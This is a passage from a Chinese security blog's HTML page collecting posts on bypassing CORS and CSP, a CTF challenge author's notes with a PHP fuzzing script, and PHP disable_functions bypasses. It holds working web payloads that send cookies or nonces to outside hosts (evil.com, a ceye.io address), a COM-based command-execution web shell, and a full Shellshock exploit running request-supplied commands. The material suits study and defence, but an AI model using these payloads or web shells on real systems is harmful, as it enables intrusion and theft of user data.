      <a data-url="https://www.ccreater.top/1970/01/01/XNUCA_2020_oooooooldjs%E9%A2%98%E8%A7%A3/" data-id="ckmn5756o004fs1nidrug3rlp" data-title="XNUCA_2020_oooooooldjs题解" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-bypass CORS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/bypass%20CORS/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/bypass%20CORS/">bypass CORS</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-CORS"><a href="#bypass-CORS" class="headerlink" title="bypass CORS"></a>bypass CORS</h1><h2 id="什么是CORS"><a href="#什么是CORS" class="headerlink" title="什么是CORS"></a>什么是CORS</h2><p>CORS: Cross Origin Resource Share,设置在服务端，客户端执行的一种策略。</p>
<blockquote>
<p>出于安全原因，浏览器限制从脚本内发起的跨源HTTP请求或者 跨站请求可以正常发起，但是返回结果被浏览器拦截了 。 例如，XMLHttpRequest和Fetch API遵循同源策略。 这意味着使用这些API的Web应用程序只能从加载应用程序的同一个域请求HTTP资源，除非响应报文包含了正确CORS响应头。 </p>
</blockquote>
<h2 id="相关的字段"><a href="#相关的字段" class="headerlink" title="相关的字段"></a>相关的字段</h2><p>响应：</p>
<pre><code>Access-Control-Allow-Origin
Access-Control-Expose-Headers
Access-Control-Max-Age
Access-Control-Allow-Credentials
Access-Control-Allow-Methods
Access-Control-Allow-Headers
</code></pre><p>请求：</p>
<pre><code>Origin
Access-Control-Request-Method
Access-Control-Request-Headers
</code></pre><h2 id="CORS配置错误"><a href="#CORS配置错误" class="headerlink" title="CORS配置错误"></a>CORS配置错误</h2><h3 id="根据某些字段来设置ACAO头"><a href="#根据某些字段来设置ACAO头" class="headerlink" title="根据某些字段来设置ACAO头"></a>根据某些字段来设置ACAO头</h3><pre><code>GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...

根据Origin头来设置Access-Control-Allow-Origin

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true</code></pre><h3 id="对Origin头的错误解析"><a href="#对Origin头的错误解析" class="headerlink" title="对Origin头的错误解析"></a>对Origin头的错误解析</h3><p>因为要对子域名的支持，所以有些网站会这样写:</p>
<pre><code>if Origin.domain startwith &quot;domain.com&quot;:
    return &quot;Access-Control-Allow-Origin: &quot;+Origin
</code></pre><p>或者</p>
<pre><code>if Origin.domain endwith &quot;domain.com&quot;:
    return &quot;Access-Control-Allow-Origin: &quot;+Origin
</code></pre><p>像这种都很好绕过：</p>
<p>domain.com.evildomain.com 或者 evildomain-domain.com</p>
<h3 id="白名单中存在-null"><a href="#白名单中存在-null" class="headerlink" title="白名单中存在:null"></a>白名单中存在:null</h3><p> Origin支持值null，在某些情况下，浏览器可能会在Origin标头中发送值null：</p>
<ul>
<li><p>跨站点重定向</p>
</li>
<li><p>来自序列化数据的请求</p>
</li>
<li><p>使用<code>file</code>协议的请求</p>
</li>
<li><p>沙盒中的跨域请求</p>
</li>
</ul>
<h2 id="利用受信任的域"><a href="#利用受信任的域" class="headerlink" title="利用受信任的域"></a>利用受信任的域</h2><p>在受信任的域上找到xss，就可以绕过CORS</p>
<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>23333</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener">https://portswigger.net/web-security/cors</a> </p>
<p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/1970/01/01/bypass">https://www.ccreater.top/1970/01/01/bypass</a> CORS/](<a href="https://www.ccreater.top/1970/01/01/bypass">https://www.ccreater.top/1970/01/01/bypass</a> CORS/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/bypass%20CORS/" data-id="ckmn5756p004is1nihxstc80f" data-title="bypass CORS" class="article-share-link">Share</a>
      
	  
      
      
    </footer>
  </div>
  
</article>





  
    <article id="post-bypass_csp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/bypass_csp/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/bypass_csp/">bypass_csp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-csp"><a href="#bypass-csp" class="headerlink" title="bypass csp"></a>bypass csp</h1><p>内容安全策略  (<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSP" target="_blank" rel="noopener">CSP</a>) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (<a href="https://developer.mozilla.org/en-US/docs/Glossary/XSS" target="_blank" rel="noopener">XSS</a>) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。 </p>
<h2 id="csp语法"><a href="#csp语法" class="headerlink" title="csp语法"></a>csp语法</h2><p>CSP的特点就是他是在浏览器层面做的防护，是和同源策略同一级别，除非浏览器本身出现漏洞，否则不可能从机制上绕过。</p>
<p>CSP只允许被认可的JS块、JS文件、CSS等解析，只允许向指定的域发起请求。</p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src" target="_blank" rel="noopener"><code>default-src</code></a> :在其他资源类型没有符合自己的策略时应用该策略(有关完整列表查看<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src" target="_blank" rel="noopener"><code>default-src</code></a> )</p>
<p><img src="https://images.seebug.org/content/images/2017/10/7b7e1d4c-9d9a-4bd0-ae6d-f266871fa300.png-w331s" alt="image773"></p>
<p><img src="https://images.seebug.org/content/images/2017/10/c5a45eca-7e0c-4ebf-8143-712e4594f2fd.png-w331s" alt="image878"></p>
<h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><p><code>script-src &#39;nonce-r4nd0m&#39; &#39;strict-dynamic&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></p>
<p>script-src 中 strict-dynamic 中的作用:</p>
<ul>
<li>丢弃白名单</li>
<li>允许执行js生成的js代码，例如：document.createElement(‘script’) </li>
<li>使  nonce-only CSPs  可以工作</li>
</ul>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200520164256.png" alt="image1216"></p>
<h3 id="一些注意点"><a href="#一些注意点" class="headerlink" title="一些注意点"></a>一些注意点</h3><p><code>https://cdn.com/*</code>只能匹配<code>https://cdn.com/*</code></p>
<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="csp策略不完全导致的绕过"><a href="#csp策略不完全导致的绕过" class="headerlink" title="csp策略不完全导致的绕过"></a>csp策略不完全导致的绕过</h3><h3 id="利用302跳转"><a href="#利用302跳转" class="headerlink" title="利用302跳转"></a>利用302跳转</h3><p><code>Content-Security-Policy: default-src &#39;self &#39;; script-src http://127.0.0.1/static/</code></p>
<p>如果可信域内存在一个可控的重定向文件，那么CSP的目录限制就可以被绕过。 </p>
<p>假设static目录下存在一个302文件</p>
<pre><code>Static/302.php

&lt;?php Header(&quot;location: &quot;.$_GET[&#39;url&#39;])?&gt;</code></pre><p>像刚才一样，上传一个test.jpg 然后通过302.php跳转到upload目录加载js就可以成功执行</p>
<pre><code>&lt;script src=&quot;static/302.php?url=upload/test.jpg&quot;&gt;</code></pre><h3 id="绕过域限制的一些tricks"><a href="#绕过域限制的一些tricks" class="headerlink" title="绕过域限制的一些tricks"></a>绕过域限制的一些tricks</h3><p><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></p>
<pre><code class="html">&lt;link rel=&quot;prefetch&quot; href=&quot;http://lorexxar.cn&quot;&gt; (H5预加载)(only chrome)
&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://lorexxar.cn&quot;&gt; （DNS预加载）
&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;http://lorexxar.cn?c=[cookie]&quot;&gt;</code></pre>
<h3 id="利用可信域的资源绕过"><a href="#利用可信域的资源绕过" class="headerlink" title="利用可信域的资源绕过"></a>利用可信域的资源绕过</h3><p>很多网站都会将google,baidu……添加到可信域里面，而如果里面存在可控的输出我们便可以绕过csp</p>
<p>常用可控jsonp: <a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p>
<h3 id="bypass-nonce"><a href="#bypass-nonce" class="headerlink" title="bypass nonce"></a>bypass nonce</h3><h4 id="利用-lt-base-gt-标签"><a href="#利用-lt-base-gt-标签" class="headerlink" title="利用&lt;base&gt;标签"></a>利用<code>&lt;base&gt;</code>标签</h4><p>Specify a default URL and a default target for all links on a page:</p>
<pre><code class="html">&lt;head&gt;
  &lt;base href=&quot;https://www.evil.com/&quot; target=&quot;_blank&quot;&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;img src=&quot;images/stickman.gif&quot; width=&quot;24&quot; height=&quot;39&quot; alt=&quot;Stickman&quot;&gt;&lt;!-- load  https://www.evil.com/images/stickman.gif --&gt;
&lt;a href=&quot;tags/tag_base.asp&quot;&gt;HTML base Tag&lt;/a&gt;
&lt;/body&gt;&lt;!-- point to https://www.evil.com/tags/tag_base.asp --&gt;</code></pre>
<p>因此我们可以设置个<code>&lt;base&gt;</code>标签，将相对路径导向恶意的网站</p>
<pre><code class="html">&lt;!-- XSS --&gt;
&lt;base href=&quot;https://evil.com/&quot;&gt;
&lt;!-- End XSS --&gt;
…
&lt;script src=&quot;foo/bar.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre>
<p><a href="https://evil.com/foo/bar.js" target="_blank" rel="noopener">https://evil.com/foo/bar.js</a></p>
<pre><code>alert(0000);</code></pre><p>成功执行</p>
<p>防御方式：</p>
<p>在csp中添加：base-uri ‘none’ 或 base-uri ‘self’</p>
<h4 id="利用chrome-bug-来修改script-src的值"><a href="#利用chrome-bug-来修改script-src的值" class="headerlink" title="利用chrome bug 来修改script src的值"></a>利用chrome bug 来修改script src的值</h4><pre><code class="html">&lt;!-- XSS --&gt;
&lt;svg&gt;&lt;set href=&quot;victim&quot; attributeName=&quot;href&quot; to=&quot;data:,alert(1)&quot; /&gt;
&lt;!-- End XSS --&gt;
…
&lt;script id=&quot;victim&quot; src=&quot;foo.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre>
<p>SVG中的set标签可以修改其他标签的属性值</p>
<p>该漏洞在chrome58中修复</p>
<h4 id="steal-nonce"><a href="#steal-nonce" class="headerlink" title="steal nonce"></a>steal nonce</h4><h5 id="via-CSS-selectors"><a href="#via-CSS-selectors" class="headerlink" title="via CSS selectors"></a>via CSS selectors</h5><pre><code class="html">&lt;!-- XSS --&gt;
&lt;style&gt;
script { display: block }
script[nonce^=&quot;a&quot;]:after { content: url(&quot;record?a&quot;) }
script[nonce^=&quot;b&quot;]:after { content: url(&quot;record?b&quot;) }
&lt;/style&gt;
&lt;!-- End XSS --&gt;
&lt;script src=&quot;foo/bar.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre>
<p>可以联合其他标签来发出请求，如<code>&lt;a&gt;</code> …</p>
<pre><code class="html">&lt;style&gt;script[nonce^=&quot;0&quot;]~a{background:url(&quot;http://y5pwcd.ceye.io/success&quot;)}&lt;/style&gt;</code></pre>
<p>相关的css 语法</p>
<p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors</a> </p>
<p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors</a> </p>
<h5 id="via-dangling-markup-attack"><a href="#via-dangling-markup-attack" class="headerlink" title="via dangling markup attack"></a>via dangling markup attack</h5><p>破坏原有的结构，将script标签变成文本，诱使用户点击</p>
<pre><code class="html">&lt;!-- XSS --&gt; &lt;form method=&quot;post&quot; action=&quot;//evil.com/form&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;click&quot;&gt;&lt;textarea name=&quot;nonce&quot;&gt;
&lt;!-- End XSS --&gt;
&lt;script src=&quot;foo/bar.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre>
<h3 id="JS-framework-based-CSP-Bypasses"><a href="#JS-framework-based-CSP-Bypasses" class="headerlink" title="JS framework-based CSP Bypasses"></a>JS framework-based CSP Bypasses</h3><p>利用低版本JQuery等js框架漏洞来绕过csp</p>
<h2 id="绕过实例"><a href="#绕过实例" class="headerlink" title="绕过实例"></a>绕过实例</h2><h2 id="一些工具"><a href="#一些工具" class="headerlink" title="一些工具"></a>一些工具</h2><p>检查csp: <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a> </p>
<p>常用可控jsonp: <a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p>
<p><a href="https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa" target="_blank" rel="noopener">csp mitigator</a> :一个csp调试工具</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p> [Spagnuolo_Hack In Bo - So we broke all CSPs… You won’t guess what happened next!](<a href="https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack" target="_blank" rel="noopener">https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack</a> In Bo - So we broke all CSPs… You won’t guess what happened next!.pdf) </p>
<p><a href="https://paper.seebug.org/423/" target="_blank" rel="noopener">前端防御从入门到弃坑–CSP变迁</a></p>
<h2 id="收藏"><a href="#收藏" class="headerlink" title="收藏"></a>收藏</h2><p>Bypassing CSP script nonces via the browser cache： <a href="http://sebastian-lekies.de/csp/attacker.php" target="_blank" rel="noopener">http://sebastian-lekies.de/csp/attacker.php</a></p>
<p> <a href="https://hurricane618.me/2018/06/30/csp-bypass-summary/" target="_blank" rel="noopener">https://hurricane618.me/2018/06/30/csp-bypass-summary/</a> </p>
<p> <a href="https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/</a> </p>
<p> <a href="https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense" target="_blank" rel="noopener">https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense</a> </p>
<p> <a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf" target="_blank" rel="noopener">https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/bypass_csp/">https://www.ccreater.top/1970/01/01/bypass_csp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/bypass_csp/" data-id="ckmn5756q004ls1nieko94ayx" data-title="bypass_csp" class="article-share-link">Share</a>
      
	  
      
      
    </footer>
  </div>
  
</article>





  
    <article id="post-ciscn2020easyphp出题笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">ciscn2020easyphp出题笔记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="easyphp出题笔记"><a href="#easyphp出题笔记" class="headerlink" title="easyphp出题笔记"></a>easyphp出题笔记</h1><p>这题原意是想让大家写脚本来fuzz来发现CUFA/CUF中对引用处理不恰当而造成的崩溃，特意禁止了pcntl可是由于没有认真测试，忘记了还有CUF这个函数，结果有人直接绕过了。</p>
<p>出题人想干的事情就是我们不让他干成就是对这种情况的最好解释。最后看到自己的题目被解成那样，我也是自闭了。</p>
<p>继续正题吧。</p>
<h2 id="来由"><a href="#来由" class="headerlink" title="来由"></a>来由</h2><p>之所以会出现这题是因为前段时间的wmctf的webweb反序列化出有这样一处的利用点，我为了找到合适的函数就采取fuzz，东西没发现倒是发现php崩溃了。</p>
<h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>直接去看<a href="https://bugs.php.net/bug.php?id=79979" target="_blank" rel="noopener">bugs.php</a> 上面的，会不会是因为交到bugs.php上的原因导致这么多人解了？</p>
<h2 id="原解"><a href="#原解" class="headerlink" title="原解"></a>原解</h2><p>阅读代码我们发现:<code>if(!pcntl_wifexited($status)){phpinfo();}</code>，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。</p>
<p>fork子进程执行的代码是：</p>
<pre><code class="php">if(isset($_GET[&#39;a&#39;])&amp;&amp;is_string($_GET[&#39;a&#39;])&amp;&amp;!preg_match(&quot;/[:\\\\]|exec|pcntl/i&quot;,$_GET[&#39;a&#39;])){
            call_user_func_array($_GET[&#39;a&#39;],[$_GET[&#39;b&#39;],false,true]);</code></pre>
<p>而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：</p>
<pre><code class="php">&lt;?php

    $payloads=[
        &quot;ls&quot;,//shell命令执行测试
        &quot;index.php&quot;,//读取文件测试
        &quot;asdfasldfjaklsdfjl.php&quot;,//创建文件/文件夹测试
        &quot;echo 123;&quot;//php命令执行测试
    ];
    $str=file_get_contents(&quot;fatalerr.log&quot;);
    if(!$str){
        $str=&quot;[]&quot;;
    }
    $fatalerror=eval(&quot;return &quot;.$str.&quot;;&quot;);
    function show_result($func,$r,$v){
        if($r==NULL){
        }
        try{
            echo &quot;$func($v,false,true) return value:&quot;;
            var_dump($r);
            echo &quot;&lt;br /&gt;&quot;;
        }catch(Exception $e){}
    }

    function brute_func($a){
        global $payloads;
        global $fatalerror;

        foreach($a as $val){

            if(is_array($val)){
                brute_func($val);
                continue;
            }

            if(in_array($val,$fatalerror)){
                continue;
            }
            array_push($fatalerror,$val);
            file_put_contents(&quot;fatalerr.log&quot;,var_export($fatalerror,TRUE));
            foreach($payloads as $v){
                $r=NULL;

                $r=call_user_func_array($val,[$v,false,true]);
                show_result($val,$r,$v);

            }
            array_pop($fatalerror);

        }
    };
    $arr=get_defined_functions();
    brute_func($arr);
?&gt;</code></pre>
<p>多次执行发现：</p>
<pre><code class="php">stream_socket_server
exec
stream_socket_client</code></pre>
<p>这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码，但是这里我禁用了exec所以我们用另外两个函数引起segment fault查看phpinfo，在phpinfo中找到flag。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>希望有师傅有不同的解可以留个言啥的谢谢啦</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/ciscn2020easyphp出题笔记/">https://www.ccreater.top/1970/01/01/ciscn2020easyphp出题笔记/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" data-id="ckmn5756r004os1ni62mwdw20" data-title="ciscn2020easyphp出题笔记" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-bypass_disable_function_open_basedir" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/bypass_disable_function_open_basedir/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/bypass_disable_function_open_basedir/">bypass_disable_function_open_basedir</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h1><h2 id="危险函数-类"><a href="#危险函数-类" class="headerlink" title="危险函数/类"></a>危险函数/类</h2><pre><code>FFI
COM
exec
assert
eval
system
ini_set/ini_alter
putenv
imap_open
pcntl_exec
win_shell_execute
dl</code></pre><h2 id="利用Windows系统组件COM绕过"><a href="#利用Windows系统组件COM绕过" class="headerlink" title="利用Windows系统组件COM绕过"></a>利用Windows系统组件COM绕过</h2><p>利用条件：</p>
<pre><code>extension=php_com_dotnet.dll
com.allow_dcom = true
wshom.ocx 存在</code></pre><pre><code class="php">$command = $_GET[&#39;cmd&#39;];
$wsh = new COM(&#39;WScript.shell&#39;); // 生成一个COM对象　Shell.Application也能
$exec = $wsh-&gt;exec(&quot;cmd /c&quot;.$command); //调用对象方法来执行命令
$stdout = $exec-&gt;StdOut();
$stroutput = $stdout-&gt;ReadAll();
echo $stroutput;</code></pre>
<h2 id="GNU-Bash-环境变量远程命令执行漏洞-CVE-2014-6271"><a href="#GNU-Bash-环境变量远程命令执行漏洞-CVE-2014-6271" class="headerlink" title="GNU Bash 环境变量远程命令执行漏洞 CVE-2014-6271"></a>GNU Bash 环境变量远程命令执行漏洞 CVE-2014-6271</h2><blockquote>
<p>   被攻击的bash存在漏洞（版本小于等于4.3）<br>   攻击者可以控制环境变量<br>   新的bash进程被打开触发漏洞并执行命令</p>
</blockquote>
<p>利用php的mail函数:<a href="https://www.exploit-db.com/exploits/35146" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/35146</a> </p>
<p><a href="https://www.antiy.com/response/CVE-2014-6271.html" target="_blank" rel="noopener">https://www.antiy.com/response/CVE-2014-6271.html</a></p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h3><p>4.3及之前的bash启动解析环境变量时未对边界进行严格的限制</p>
<p>“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。</p>
<p>bash函数的格式,调用函数只需变量名+参数即可<code>函数 参数1 参数2</code></p>
<pre><code class="bash">funtion ShellShock 
{ echo &quot;Injection&quot;} ShellShock   #调用这个函数</code></pre>
<p>这个时候的Bash的环境变量：</p>
<pre><code>KEY = ShellShockVALUE = () { echo Injection; }

</code></pre><p>来看看ShellShock漏洞的真身：</p>
<pre><code class="shell">export ShellShock=&#39;() { :; }; echo;/usr/bin/whoami&#39;
bash&gt;Kr0iN</code></pre>
<p>看看环境变量你有什么<br><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1229"></p>
<pre><code class="bash">env x=&#39;() { :;}; echo Vulnerable CVE-2014-6271 &#39; bash -c &quot;echo test&quot;</code></pre>
<p><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1379"></p>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="php的mail函数"><a href="#php的mail函数" class="headerlink" title="php的mail函数()"></a>php的mail函数()</h4><p>如果服务器的默认sh是bash,mail函数会生成一个bash进程,再结合putenv()利用破壳漏洞来实现任意命令执行</p>
<p>会生成bash进程除了mail,php函数还有imap_mail，如果你仅仅通过禁用mail函数来规避这个安全问题，那么imap_mail是可以做替代的。当然，php里还可能有其他地方有调用popen或其他能够派生bash子进程的函数，通过这些地方，都可以通过破壳漏洞执行命令的。</p>
<p>更详细的解释:p牛的<a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html" target="_blank" rel="noopener">PHP Execute Command Bypass Disable_functions</a></p>
<pre><code class="php"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)
# Google Dork: none
# Date: 10/31/2014
# Exploit Author: Ryan King (Starfall)
# Vendor Homepage: http://php.net
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror
# Version: 5.* (tested on 5.6.2)
# Tested on: Debian 7 and CentOS 5 and 6
# CVE: CVE-2014-6271
&lt;pre&gt;
&lt;?php echo &quot;Disabled functions: &quot;.ini_get(&#39;disable_functions&#39;).&quot;\n&quot;; ?&gt;
&lt;?php
function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
   if(strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) {
     $tmp = tempnam(&quot;.&quot;,&quot;data&quot;);
     putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;);
     // In Safe Mode, the user may only alter environment variables whose names
     // begin with the prefixes supplied by this directive.
     // By default, users will only be able to set environment variables that
     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,
     // PHP will let the user modify ANY environment variable!
     mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#39;t actually send any mail
   }
   else return &quot;Not vuln (not bash)&quot;;
   $output = @file_get_contents($tmp);
   @unlink($tmp);
   if($output != &quot;&quot;) return $output;
   else return &quot;No output, or not vuln.&quot;;
}
echo shellshock($_REQUEST[&quot;cmd&quot;]);
?&gt;</code></pre>
<h2 id="利用php-fpm未授权访问漏洞"><a href="#利用php-fpm未授权访问漏洞" class="headerlink" title="利用php-fpm未授权访问漏洞"></a>利用php-fpm未授权访问漏洞</h2><h3 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h3><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p>
<p><a href="https://xz.aliyun.com/t/5598" target="_blank" rel="noopener">浅析php-fpm的攻击方式</a></p>
